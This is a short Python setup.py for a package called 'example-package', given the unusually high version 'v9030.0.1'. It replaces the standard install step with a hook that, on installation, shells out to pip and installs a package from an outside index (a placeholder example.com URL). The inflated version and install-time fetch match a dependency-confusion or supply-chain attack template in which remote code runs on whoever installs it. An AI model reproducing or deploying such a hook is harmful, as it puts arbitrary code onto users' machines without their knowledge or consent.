import os
from setuptools import setup
from setuptools.command.install import install
VERSION = 'v9030.0.1'
PACKAGE_NAME = 'example-package'
INDEX = 'https://example.com/simple/'
class Hook(install):
    def run(self):
        os.system('pip3 install ' + PACKAGE_NAME + ' --index-url ' + INDEX)
setup(name=PACKAGE_NAME, version=VERSION, cmdclass={'install': Hook})
